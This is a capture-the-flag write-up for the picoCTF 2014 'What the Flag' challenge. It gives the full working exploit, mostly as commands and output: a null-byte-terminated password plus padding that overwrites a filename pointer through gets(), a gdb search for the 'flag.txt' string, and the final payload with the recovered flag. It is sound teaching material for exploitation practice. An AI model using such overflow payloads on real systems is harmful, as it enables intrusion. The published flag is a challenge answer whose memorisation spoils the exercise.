# Pico CTF 2014 : What the Flag

**Category:** Binary Exploitation
**Points:** 140
**Description:**

>This binary uses stack cookies to prevent exploitation, but all hope is not lost. Read the flag from flag.txt anyways! The binary can be found at /home/what_the_flag/ on the shell server. You can solve this problem interactively [here](https://picoctf.com/problem-static/binary/WhatTheFlag/what_the_flag.html
). The source can be found [here](what_the_flag.c).

**Hint:**
>How can you enter a correct password, but still overflow the buffer? Think about what terminates gets(). Also, the file name that you want to open is already in the binary!

## Write-up

As per the hint, what terminates `gets()` is a null byte. Thus, we can still
cause an overflow like so:
```
python -c 'print "1337_P455W0RD\x00" + "AA" + "BBBB"' | strace ./what_the_flag
...
open(0x42424242, O_RDONLY)              = -1 EFAULT (Bad address)
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x42424242} ---
```

As demonstrated by `strace`, we need two bytes of padding after our password
and a null byte, and then we control the pointer to the filename!

The hint also says that the name of the file we want is already in the binary.
"not_the_flag.txt" is in the binary, which means that we can just jump to the
part that says "flag.txt" and not use the first part!
```
/home/what_the_flag$ gdb -q ./what_the_flag
Reading symbols from ./what_the_flag...(no debugging symbols found)...done.
(gdb) b*main
Breakpoint 1 at 0x8048611
(gdb) r
Starting program: /home/what_the_flag/what_the_flag

Breakpoint 1, 0x08048611 in main ()
(gdb) find 0x08048300, +9999, "flag.txt"
0x804877f
0x804977f
2 patterns found.
```
Either of the addresses, if supplied, will give us what we want. I'll just use
the first one.
```
python -c 'print "1337_P455W0RD\x00" + "AA" + "\x7f\x87\x04\x08"' |
./what_the_flag
Enter your password too see the message:
Congratulations! Here is the flag: who_needs_%eip
```
## Other write-ups and resources

* <https://ctf-team.vulnhub.com/picoctf-2014-what-the-flag/>
